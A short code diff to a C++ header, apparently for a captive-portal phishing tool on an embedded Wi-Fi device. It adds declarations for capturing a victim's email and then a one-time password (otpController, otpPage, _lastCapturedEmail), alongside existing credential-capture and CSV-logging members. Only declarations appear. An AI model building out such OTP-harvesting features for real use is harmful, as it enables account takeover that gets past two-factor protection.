@@ -90,8 +90,14 @@ private:
     unsigned long _launchTime = 0;
     unsigned long _lastPageViewTime = 0;
 
+    // OTP related members
+    bool _otpEnabled = false;
+    String _lastCapturedEmail = "";
+    bool _awaitingOtp = false;
+
     void portalController(AsyncWebServerRequest *request);
     void credsController(AsyncWebServerRequest *request);
+    void otpController(AsyncWebServerRequest *request);
 
     bool verifyCreds(String &Ssid, String &Password);
     void restartWiFi(bool reset = true);
@@ -103,6 +109,7 @@ private:
     void loadDefaultHtml(void);
     void loadDefaultHtml_one(void);
     String wifiLoadPage(void);
+    String otpPage(void);
     void saveToCSV(const String &csvLine, bool IsAPname = false);
     void drawScreen(void);
 
